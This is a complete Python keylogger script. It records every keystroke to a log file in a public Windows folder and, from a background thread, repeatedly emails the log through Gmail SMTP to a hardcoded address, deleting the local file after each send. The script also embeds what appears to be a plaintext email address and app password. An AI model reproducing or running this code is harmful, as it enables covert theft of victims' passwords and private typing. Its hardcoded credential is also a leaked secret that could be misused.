import keyboard
from datetime import datetime
import smtplib
from email.message import EmailMessage
import os
import time
import threading

log_file_path = "C:\\Users\\Public\\logfile.txt"

def on_key_press(event):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file_path, "a") as f:
        f.write(f"{timestamp} - {event.name}\n")

keyboard.on_press(on_key_press)

# === EMAIL SENDER PART ===
def send_email_with_attachment(sender_email, app_password, recipient_email, subject, body, file_path):
    if not os.path.exists(file_path):
        print("Log file not found.")
        return

    msg = EmailMessage()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.set_content(body)

    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(f.name)

        msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, app_password)
            smtp.send_message(msg)
            print(f"Email sent successfully at {datetime.now().strftime('%H:%M:%S')}.")

        # Delete file after sending
        os.remove(file_path)
        print("Log file deleted after email.")

    except Exception as e:
        print(f"Failed to send email: {e}")

# === AUTOMATED MAILER EVERY 10 MINUTES ===
def schedule_email():
    while True:
        time.sleep(60)  # Wait for 10 minutes
        send_email_with_attachment(
            sender_email="sonilakshya2004@gmail.com",
            app_password="wqjnkewqycopolwy",  
            recipient_email="sonilakshya2004@gmail.com",
            subject="Keylogger Log File",
            body="Attached is the keylogger log file.",
            file_path=log_file_path
        )

# Run email sender in background thread
threading.Thread(target=schedule_email, daemon=True).start()

# Keep main thread running for keylogger
keyboard.wait()
